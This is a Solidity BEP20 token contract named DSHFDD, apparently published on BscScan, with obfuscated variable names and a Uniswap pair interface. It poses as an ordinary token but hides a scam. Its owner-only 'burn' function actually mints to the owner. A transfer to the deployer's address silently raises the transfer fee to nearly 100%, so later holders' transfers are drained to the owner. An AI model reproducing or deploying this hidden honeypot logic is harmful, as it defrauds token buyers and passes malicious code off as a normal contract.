/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.3;
contract DSHFDD {
uint256 private  MHETFB = 1000000000000000;
address private  MGMFWO = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
uint256 private  LMCYSJ = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
address private  OGOUEV = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant BKFXTV = 99999;
uint256 private  PFXYIE = 100000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  OJCQPX = 1000000000000000000;
address private  XGBPBM = address(0);
string public  symbol = "DSHFDD";
address private  ZIYHVA = address(0);
uint8 public constant decimals = 18;
address private  ZLAURF = address(0);
uint256 private  NGBUYB = 10000000000000;
string public  name = "DSHFDD";
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  IETRGH = 10000000000;
uint256 private  HPCUAW = 1000000000000000000000;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getMGMFWO() private returns (address) {
return MGMFWO;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getPFXYIE() private returns (uint256) {
return PFXYIE;
}

constructor () public {
XGBPBM = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getMHETFB() private returns (uint256) {
return MHETFB;
}

function _getZLAURF() private returns (address) {
return ZLAURF;
}

function _getIETRGH() private returns (uint256) {
return IETRGH;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tSJGZHJ 0");
require(spender != address(0), "fSJGZHJ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getHPCUAW() private returns (uint256) {
return HPCUAW;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getOGOUEV() private returns (address) {
return OGOUEV;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getLMCYSJ() private returns (uint256) {
return LMCYSJ;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SJGZHJ");
require(to != address(0), "SJGZHJ");
require(amount <= balanceOf[from], "SJGZHJ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* BKFXTV/OJCQPX ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==XGBPBM){
OJCQPX = BKFXTV+2;
}
emit Transfer(from, to, transferAmount);
}
function _getZIYHVA() private returns (address) {
return ZIYHVA;
}

function _getNGBUYB() private returns (uint256) {
return NGBUYB;
}


}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}